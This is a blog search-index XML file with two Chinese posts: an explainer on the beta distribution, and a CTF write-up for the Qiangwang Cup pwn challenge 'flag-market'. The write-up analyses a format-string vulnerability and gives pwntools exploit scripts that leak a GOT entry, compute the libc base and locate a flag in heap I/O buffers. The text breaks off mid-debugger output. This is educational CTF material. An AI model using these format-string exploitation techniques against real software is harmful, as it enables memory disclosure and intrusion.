<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>贝塔分布</title>
      <link href="/2025/10/25/%E8%B4%9D%E5%A1%94%E5%88%86%E5%B8%83/"/>
      <url>/2025/10/25/%E8%B4%9D%E5%A1%94%E5%88%86%E5%B8%83/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="贝塔分布"><a href="#贝塔分布" class="headerlink" title="贝塔分布"></a>贝塔分布</h1><p>贝塔分布是一种连续概率分布，它描述了在一个固定区间内的随机变量的概率分布</p><p>贝塔分布由两个正数参数α(alpha)和β(beta)定义，这两个参数决定了分布的形状</p><p>它的概率密度函数 (PDF) 公式如下：</p><p>$$<br>f(x;\alpha, \beta) &#x3D; \frac{\Gamma(\alpha+\beta)}{\Gamma(\alpha)\Gamma(\beta)}x^{\alpha-1}(1-x)^{\beta-1}<br>$$</p><p>其中：<strong>x</strong>是一个介于0和1之间的随机变量</p><p>$\Gamma()$是伽马函数，根据其参数有两种不同的定义：</p><p>$$<br>\begin{cases}<br>\Gamma(n)&#x3D;(n-1)!\<br>\Gamma(z) &#x3D; \int_{0}^{\infty}t^{z-1}e^{-t}dt<br>\end{cases}<br>$$</p><p>其中：</p><ul><li><p>z为除去非正整数的整个复数域</p></li><li><p>n为正整数</p></li></ul><h3 id="主要性质与特征"><a href="#主要性质与特征" class="headerlink" title="主要性质与特征"></a>主要性质与特征</h3><p>贝塔分布具有一些重要的统计特性：</p><ul><li>期望：$E[x] &#x3D; \frac{\alpha}{\alpha+\beta}$</li></ul><ul><li><p>方差：$Var(x) &#x3D; \frac{\alpha\beta}{{(\alpha+\beta)}^2(\alpha+\beta+1)}$</p></li><li><p>众数：$\frac{\alpha-1}{\alpha+\beta-2}$</p></li></ul><blockquote><p>期望：是试验中每次可能的结果乘以其结果概率的总和<br>方差：描述的是一个随机变量的离散程度，即一组数字与其平均值之间的距离的度量，是随机变量与其总体均值或样本均值的离差的平方的期望<br>众数：指一组数据中出现次数最多的数据值</p></blockquote><p>贝塔分布的一个显著特点是其<strong>灵活性</strong>。通过调整 α 和 β 的值，可以得到各种形状的分布，例如：</p><ul><li><strong>α &#x3D; 1, β &#x3D; 1:</strong> 此时贝塔分布退化为 上的均匀分布。</li><li><strong>α &gt; 1, β &gt; 1:</strong> 分布呈现单峰形态。</li><li><strong>α &lt; 1, β &lt; 1:</strong> 分布呈现 U 形。</li><li><strong>α &#x3D; 1, β &gt; 1:</strong> 分布呈 J 形，向左偏斜。</li><li><strong>α &gt; 1, β &#x3D; 1:</strong> 分布呈反 J 形，向右偏斜。</li></ul><p>这种多变性使得贝塔分布能够模拟在 (0, 1) 区间内极大似然法可能求出的任意最大值点的概率值。</p><h3 id="为何使用贝塔分布？"><a href="#为何使用贝塔分布？" class="headerlink" title="为何使用贝塔分布？"></a>为何使用贝塔分布？</h3><p>贝塔分布在实际应用中非常有用，主要原因如下：</p><ol><li><p><strong>为概率建模:</strong> 由于其值域在0和1之间，它天然地适用于为某项实验的成功概率建模</p></li><li><p><strong>贝叶斯统计中的应用:</strong> 在贝叶斯推断中，贝塔分布是二项分布的<strong>共轭先验</strong>。 这意味着，如果使用贝塔分布作为二项分布中成功概率的先验分布，那么在观测到新数据后，其后验分布仍然是贝塔分布，这极大地简化了计算</p></li></ol><p><strong>举例说明：</strong><br>假设我们要预测一位棒球运动员的击球率。在没有观察任何比赛之前，我们可以根据历史数据或经验设定一个先验的贝塔分布（例如，平均击球率在 0.27 左右）。 当这位运动员进行了一些比赛后（例如，10 次击球，3 次命中），我们可以利用贝叶斯公式来更新这个分布。新的后验分布仍然是一个贝塔分布，但它的形状会根据新的数据进行调整，从而为我们提供一个更精确的击球率预测</p>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
          <category> 知识点 </category>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概率论 </tag>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第九届强网杯线上赛Pwn_flag-market</title>
      <link href="/2025/10/25/flag-market/"/>
      <url>/2025/10/25/flag-market/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第九届强网杯线上赛PWN-flag-market"><a href="#第九届强网杯线上赛PWN-flag-market" class="headerlink" title="第九届强网杯线上赛PWN_flag-market"></a>第九届强网杯线上赛PWN_flag-market</h1><h2 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h2><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023203039923-1200912138.png"><img src="/img/flag-market/3622178-20251023203039923-1200912138.png" alt="img"></a></p><h2 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h2><p>下载题目给的附件，查看文件ctf.xinetd之后，知道我们的可执行程序名为chall：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023203727187-200295548.png"><img src="/img/flag-market/3622178-20251023203727187-200295548.png" alt="img"></a></p><p>这个文件在附件中的bin目录下。</p><p>通过<code>file</code>命令查看文件类型：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023203957917-176528406.png"><img src="/img/flag-market/3622178-20251023203957917-176528406.png" alt="image"></a></p><p>通过<code>checksec</code>命令查看文件保护措施：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023204015264-1836719827.png"><img src="/img/flag-market/3622178-20251023204015264-1836719827.png" alt="image"></a></p><h2 id="三、反汇编文件开始分析"><a href="#三、反汇编文件开始分析" class="headerlink" title="三、反汇编文件开始分析"></a>三、反汇编文件开始分析</h2><h3 id="1、分析程序基本逻辑"><a href="#1、分析程序基本逻辑" class="headerlink" title="1、分析程序基本逻辑"></a>1、分析程序基本逻辑</h3><p>将chall文件丢入64位的IDA Pro中，开始反汇编操作，由于汇编代码过长，我们通过看C语言代码来把握整体代码逻辑：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __usercall main@&lt;rax&gt;(<span class="type">char</span> **a1@&lt;rsi&gt;, <span class="type">char</span> **a2@&lt;rdx&gt;, __int64 a3@&lt;rbp&gt;, __int64 a4@&lt;rdi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 *v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// rt1</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp-8Ch] [rbp-8Ch]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp-80h] [rbp-80h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v12; <span class="comment">// [rsp-71h] [rbp-71h]</span></span><br><span class="line">  <span class="type">signed</span> __int16 v13; <span class="comment">// [rsp-6Dh] [rbp-6Dh]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp-68h] [rbp-68h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v17 = a3;</span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  sub_401336(a4, a1, a2);</span><br><span class="line">  v12 = <span class="string">&#x27;alf/&#x27;</span>;</span><br><span class="line">  v13 = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">  v11 = my_fopen(&amp;v12, &amp;unk_402008);</span><br><span class="line">  dword_40430C = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;welcome to flag market!\ngive me money to buy my flag,\nchoice: \n1.take my money\n2.exit&quot;</span>);</span><br><span class="line">    my_memset(&amp;v14, <span class="number">0LL</span>, <span class="number">16LL</span>);</span><br><span class="line">    v4 = &amp;v14;</span><br><span class="line">    my_read();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)my_atoi() != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    my_puts(<span class="string">&quot;how much you want to pay?&quot;</span>);</span><br><span class="line">    my_memset(&amp;v14, <span class="number">0LL</span>, <span class="number">16LL</span>);</span><br><span class="line">    v4 = &amp;v14;</span><br><span class="line">    my_read();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)my_atoi() == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      my_puts(aThankYouForPay);</span><br><span class="line">      <span class="keyword">if</span> ( !dword_40430C || (v4 = (__int64 *)<span class="number">64</span>, !my_fgets(&amp;v15, <span class="number">64LL</span>, v11)) )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="string">&quot;something is wrong&quot;</span>;</span><br><span class="line">        my_puts(<span class="string">&quot;something is wrong&quot;</span>);</span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &gt; <span class="number">64</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="string">&quot;\nThank you for your patronage!&quot;</span>;</span><br><span class="line">          my_puts(<span class="string">&quot;\nThank you for your patronage!&quot;</span>);</span><br><span class="line">          result = <span class="number">0LL</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( *((_BYTE *)&amp;v17 + i - <span class="number">80</span>) == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        my_putchar((<span class="type">unsigned</span> <span class="type">int</span>)*((<span class="type">char</span> *)&amp;v17 + i - <span class="number">80</span>));</span><br><span class="line">        my_sleep(<span class="number">1LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      my_memset(&amp;v15, <span class="number">0LL</span>, <span class="number">64LL</span>);</span><br><span class="line">      my_puts(a1m31mError0mSo);</span><br><span class="line">      my_puts(<span class="string">&quot;opened user.log, please report:&quot;</span>);</span><br><span class="line">      my_memset(aEverythingIsOk, <span class="number">0LL</span>, <span class="number">256LL</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, aEverythingIsOk);</span><br><span class="line">      my_getchar(<span class="string">&quot;%s&quot;</span>, aEverythingIsOk);</span><br><span class="line">      v7 = my_open(<span class="string">&quot;user.log&quot;</span>);</span><br><span class="line">      my_write(v7, aEverythingIsOk, <span class="number">256LL</span>);</span><br><span class="line">      my_puts(aOkNowYouCanExi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      my_printf(aYouAreSoParsim);</span><br><span class="line">      <span class="keyword">if</span> ( dword_40430C )</span><br><span class="line">      &#123;</span><br><span class="line">        my_fclose(v11);</span><br><span class="line">        dword_40430C = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  result = my_exit();</span><br><span class="line">LABEL_16:</span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v8 = v16 - v9;</span><br><span class="line">  <span class="keyword">if</span> ( v16 != v9 )</span><br><span class="line">    result = my___stack_chk_fail(v5, v4, v8);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我已经将一些为命令函数进行了重命名操作，这样便于我们的分析。重命名可以依据经验，也可以通过gdb动态调试来确定函数。</p></blockquote><p>程序首先会通过<code>fopen</code>函数打开根目录下的flag文件，接着会出现两个选择即：</p><ul><li>take my money</li><li>exit</li></ul><p>选择二就直接退出了。</p><p>如果我们选择一，那么程序就会通过<code>read</code>函数来获取你的输入，接着判断你输入的值是否是“-1”：</p><ul><li>是：将打开的flag文件中的内容写入到地址&amp;v15处，然后通过for循环逐字节读取flag。但是，遇到“{”之后就会终止读取。接下来，就是一个向上汇报错误的过程。</li><li>不是：打印一段文字，然后关闭（<code>fclose</code>）打开的flag文件。</li></ul><p>很明显，这一部分出现<code>printf</code>函数，而且该函数并没有指定格式化字符，那么会不会存在格式化字符串漏洞？</p><h3 id="2、格式化字符串漏洞"><a href="#2、格式化字符串漏洞" class="headerlink" title="2、格式化字符串漏洞"></a>2、格式化字符串漏洞</h3><p><code>printf</code>的参数来自<code>.data</code>段：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00000000004041C0 aYouAreSoParsim db &#x27;You are so parsimonious!!!&#x27;,0</span><br></pre></td></tr></table></figure><p>如果我们能控制这一部分的数据，就可以造成格式化字符串漏洞。</p><p>观察后，可以发现我们的<code>scanf</code>函数用的格式化字符是<code>%s</code>即可以无限长地输入（只要不输入空白字符），而且输入的位置刚好也在<code>.data</code>段且位置比“aYouAreSoParsim”低：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00000000004040C0 aEverythingIsOk db &#x27;everything is ok~&#x27;,0</span><br></pre></td></tr></table></figure><p>那么，格式化字符串漏洞的触发就是通过<code>scanf</code>函数的输入来覆盖“aYouAreSoParsim”部分，接着通过<code>printf</code>函数实现漏洞的触发。</p><h3 id="3、思路"><a href="#3、思路" class="headerlink" title="3、思路"></a>3、思路</h3><p>找到了关键漏洞，我们就要理一下思路，即思考我该怎么做才能获得flag？</p><p>首先，我们肯定不能通过任意地址读来去栈上找flag，因为虽然flag被写在了栈上，但是，后续程序利用了<code>my_memset(&amp;v15, 0LL, 64LL);</code>将该位置的信息全都清空了。</p><p>但是，堆上的flag呢？</p><p>可能有人会有疑惑，堆上哪来的flag，整个程序我都没见过堆操作。</p><p>其实是有的。简单来说，I&#x2F;O类型的函数（如<code>fopen</code>，<code>fgets</code>等）为了提到效率，会用到“缓冲”机制，这个缓冲机制就是通过调用<code>malloc</code>来实现的。</p><p>让我们从一个简单的场景开始，逐步深入。</p><p>场景：如果没有缓冲会怎样？</p><p>想象一下，你的程序要从一个文件中读取1MB（大约一百万字节）的数据。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *fp = fopen(<span class="string">&quot;large_file.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">    fgetc(fp); <span class="comment">// 一次只读一个字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有缓冲机制，<code>fgetc</code>的每一次调用都会触发一次系统调用。系统调用是程序从用户态切换到内核态去请求操作系统服务的唯一方式。这个切换过程涉及到上下文保存、权限检查等，开销非常大。</p><p>这意味着，为了读取1MB的数据，你的程序需要进行一百万次的用户态&#x2F;内核态切换。这将会慢得令人无法忍受。</p><p>为了解决这个问题，C标准库（glibc）引入了缓冲机制。</p><p>假设，当你的程序第一次调用<code>fopen</code>打开一个文件时，会发生以下事情：</p><ol><li><strong>创建管理结构</strong>：<code>fopen</code>在内部会调用<code>malloc</code>来开辟一片空间，这片空间中会存放一个叫<code>FILE</code>的结构体（或<code>_IO_FILE_plus</code>），该结构体用来管理：<ul><li>文件的描述符（操作系统给的一个数字）。</li><li>当前读写位置。</li><li>是否发生了错误。</li><li>指向缓冲区的指针。</li></ul></li><li><strong>分配I&#x2F;O缓冲区</strong>：光有管理结构还不够，还需要一个地方来存放从文件里预读出来的数据。这个地方就是I&#x2F;O缓冲区。<ul><li>当你的程序第一次尝试从文件读取数据时（例如，第一次调用<code>fgetc</code>或<code>fgets</code>），<code>_IO_FILE</code>的内部逻辑会检查自己是否有缓冲区。</li><li>如果没有，它就会向内核申请一大块数据，即此时第二次调用了<code>malloc</code>。</li><li>然后，就是读的操作了（它会发出一次系统调用如<code>read</code>），让内核一次性把数据从文件填充到这个新分配的缓冲区里。</li><li>最后，读写函数会从这片缓冲区中操作数据。</li></ul></li></ol><p>在完成了上述初始化之后，后续的I&#x2F;O操作就变得非常高效了：</p><ul><li><code>fgetc</code>的调用，将不再需要任何系统调用。它们只是简单地从那个已经填满数据的堆上缓冲区里，一个接一个地取出字节。这只是纯粹的内存操作，速度极快。</li><li>只有当缓冲区里的数据被全部读完后，下一次读取操作才会再次触发一次系统调用，去请求下一个数据块。</li></ul><p>对于写入操作（如<code>fprintf</code>, <code>fputc</code>），原理也是类似的，这里不再赘述。</p><p>好，了解了这些之后，我们应该知道，堆上为什么也会有flag了吧。</p><p>那么，我们的思路就是，利用格式化字符串漏洞，实现任意地址读取，读到堆上的flag。</p><p>问题又出现了，怎么知道堆的地址呢？</p><p>这又涉及到一个知识点：针对动态链接的程序，在他的libc库中，会存在指向IO缓冲区的指针。</p><blockquote><p>这也很好理解，libc库中有很多的IO函数，那么操作一块堆空间最好的方式就是给我一个指向它的指针。</p></blockquote><p>综上，我们的思路：</p><ol><li>格式化字符串漏洞泄露libc基址。</li><li>通过格式化字符串漏洞泄露堆上的flag。</li></ol><h2 id="四、Poc的构造"><a href="#四、Poc的构造" class="headerlink" title="四、Poc的构造"></a>四、Poc的构造</h2><blockquote><p>根据思路，按部就班地完成Poc的构造。</p></blockquote><h3 id="1、泄露libc基址"><a href="#1、泄露libc基址" class="headerlink" title="1、泄露libc基址"></a>1、泄露libc基址</h3><p>首先分析栈上的构造，程序中的第二个read函数的输入位置为<code>[rbp-60h]</code>。</p><p>flag在栈上的临时位置在<code>[rbp-50h]</code>他们的关系就是：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023213430288-1118781673.png"><img src="/img/flag-market/3622178-20251023213430288-1118781673.png" alt="img"></a></p><p>写一个测试脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,9999)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*padding</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    payload += <span class="string">f&#x27;%<span class="subst">&#123;i&#125;</span>$p-&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;opened user.log, please report:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x404050</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以看到，运行之后可以看到（关键部分）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x2-(nil)-0x7ffd2c748851-0x1999999999999999-(nil)-0xc000-0x402b00000-0xffffffff00000010-0x27c212a0-0x2f0000000000c000-0x7f0067616c66-0x32-0x404050-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-0x7ffd2c748990-0x8988df52354d0500-0x7ffd2c748950-0x7e84d7c2a1ca-0x7ffd2c748900-0x7ffd2c7489d8-0x100400040-0x40139b-0x7ffd2c7489d8-0x9a34b258d05c60e2-0x1-(nil)-0x403e18-0x7e84d800c000-0x9a34b258d37c60e2-0x98c7453481fe60e2-0x7ffd00000000-(nil)-(nil)-0x1-0x7ffd2c7489d0-0x8988df52354d0500-0x7ffd2c7489b0-0x7e84d7c2a28b-0x7ffd2c7489e8-0x403e18-0x7ffd2c7489e8-0x40139b-welcome to flag market!</span><br></pre></td></tr></table></figure><p>很明显，这连续的<code>(nil)</code>就是<code>my_memset(&amp;v15, 0LL, 64LL);</code>的杰作。</p><p>因此，我们可以推断，第14个位置就是<code>[rbp-50h]</code></p><p>那么，我们可以通过和<code>read</code>输入的配合，实现：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023214316077-107934784.png"><img src="/img/flag-market/3622178-20251023214316077-107934784.png" alt="img"></a></p><p>本阶段Poc:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,9999)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*padding + <span class="string">b&#x27;%13$s#&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(1,50):</span></span><br><span class="line"><span class="comment">#     payload += f&#x27;%&#123;i&#125;$p-&#x27;.encode()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;opened user.log, please report:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x404050</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;#&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;read_addr:&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - <span class="number">0x11ba80</span></span><br></pre></td></tr></table></figure><p>其中，<code>p64(0x404050)</code>是read@got的地址：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.got.plt:0000000000404050 off_404050      dq offset sub_4010A0    ; DATA XREF: my_read+4↑r</span><br></pre></td></tr></table></figure><p><code>0x11ba80</code>，这个偏移量，是<code>read</code>在libc.so.6中的偏移量，为什么选择这个？</p><p>在上述Poc的输出中，会输出泄露的<code>read</code>的真实地址：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] read_addr:0x78a9a251ba80</span><br></pre></td></tr></table></figure><p>拿这个地址去<a href="https://libc.blukat.me/">网站</a>上搜索一下</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023215019295-212912469.png"><img src="/img/flag-market/3622178-20251023215019295-212912469.png" alt="image"></a></p><p>接着问AI：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023215116586-1271645686.png"><img src="/img/flag-market/3622178-20251023215116586-1271645686.png" alt="image"></a></p><p>然后在网站上点击该库文件即可看到偏移量：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023215157409-635275790.png"><img src="/img/flag-market/3622178-20251023215157409-635275790.png" alt="image"></a></p><h3 id="2、找指向缓冲区的指针"><a href="#2、找指向缓冲区的指针" class="headerlink" title="2、找指向缓冲区的指针"></a>2、找指向缓冲区的指针</h3><p>我们通过gdb的find命令，就可以很容易找到在libc中指向缓冲区的指针</p><p>为了程序的顺利执行，我们需要在我们的虚拟器的根目录下创建一个flag文件。原因很简单，我们之前分析过，程序会打开根目录下的flag文件，如果没有找到，就会报错。</p><p>我这已经准备好了：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(pwn-env) zyf@zhengyifeng:/mnt/c/Users/14363/Downloads/ctf-downloads/flag-market/bin$ <span class="built_in">cat</span> /flag</span><br><span class="line">flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;</span><br></pre></td></tr></table></figure><p>gdb打开程序，将断点设置在<code>0x4015B3</code></p><blockquote><p>断点没硬性要求，但是需要在建立缓冲区之后，即<code>fgets</code>之后。</p></blockquote><p>通过<code>got</code>命令找到read的真实地址：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /mnt/c/Users/14363/Downloads/ctf-downloads/flag-market/bin/chall:</span><br><span class="line">GOT protection: Partial RELRO | Found 17 GOT entries passing the filter</span><br><span class="line">[0x404018] putchar@GLIBC_2.2.5 -&gt; 0x7ffff7c89ce0 (putchar) ◂— endbr64</span><br><span class="line">[0x404020] puts@GLIBC_2.2.5 -&gt; 0x7ffff7c87be0 (puts) ◂— endbr64</span><br><span class="line">[0x404028] write@GLIBC_2.2.5 -&gt; 0x401050 ◂— endbr64</span><br><span class="line">[0x404030] fclose@GLIBC_2.2.5 -&gt; 0x401060 ◂— endbr64</span><br><span class="line">[0x404038] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401070 ◂— endbr64</span><br><span class="line">[0x404040] <span class="built_in">printf</span>@GLIBC_2.2.5 -&gt; 0x401080 ◂— endbr64</span><br><span class="line">[0x404048] memset@GLIBC_2.2.5 -&gt; 0x7ffff7d89440 (__memset_avx2_unaligned_erms) ◂— endbr64</span><br><span class="line">[0x404050] <span class="built_in">read</span>@GLIBC_2.2.5 -&gt; 0x7ffff7d1ba80 (<span class="built_in">read</span>) ◂— endbr64</span><br><span class="line">[0x404058] fgets@GLIBC_2.2.5 -&gt; 0x7ffff7c85b30 (fgets) ◂— endbr64</span><br><span class="line">[0x404060] getchar@GLIBC_2.2.5 -&gt; 0x4010c0 ◂— endbr64</span><br><span class="line">[0x404068] setvbuf@GLIBC_2.2.5 -&gt; 0x7ffff7c88550 (setvbuf) ◂— endbr64</span><br><span class="line">[0x404070] open@GLIBC_2.2.5 -&gt; 0x4010e0 ◂— endbr64</span><br><span class="line">[0x404078] fopen@GLIBC_2.2.5 -&gt; 0x7ffff7c85e60 (fopen64) ◂— endbr64</span><br><span class="line">[0x404080] atoi@GLIBC_2.2.5 -&gt; 0x7ffff7c46660 (atoi) ◂— endbr64</span><br><span class="line">[0x404088] __isoc99_scanf@GLIBC_2.7 -&gt; 0x401110 ◂— endbr64</span><br><span class="line">[0x404090] <span class="built_in">exit</span>@GLIBC_2.2.5 -&gt; 0x401120 ◂— endbr64</span><br><span class="line">[0x404098] <span class="built_in">sleep</span>@GLIBC_2.2.5 -&gt; 0x7ffff7d0ec50 (<span class="built_in">sleep</span>) ◂— endbr64</span><br></pre></td></tr></table></figure><p>算出libc的基址：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="variable">$libc_base</span> =  0x7ffff7d1ba80 - 0x11ba80</span><br><span class="line"><span class="variable">$1</span> = 0x7ffff7c00000</span><br></pre></td></tr></table></figure><p>接下来，我们可以先在堆上找到flag的准确位置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x405000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span 